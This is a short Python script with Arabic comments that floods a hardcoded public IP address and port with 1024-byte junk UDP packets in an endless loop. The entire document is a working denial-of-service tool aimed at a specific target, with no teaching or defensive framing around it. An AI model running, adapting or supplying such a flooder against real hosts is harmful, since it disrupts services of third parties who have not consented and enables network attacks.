import socket

target_ip = '164.92.234.227'
target_port = 7777  # أو أي منفذ آخر يمكنك اختياره

# إعداد الحزمة UDP المزيفة
udp_payload = b'\x41' * 1024  # هنا يتم إنشاء حزمة مليئة بالبيانات المزيفة (مثلاً، 1024 بايت)

# إرسال الحزم
while True:
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.sendto(udp_payload, (target_ip, target_port))
        print("Sent UDP packet to {}:{}".format(target_ip, target_port))
    except Exception as e:
        print("An error occurred:", e)
    finally:
        udp_socket.close()
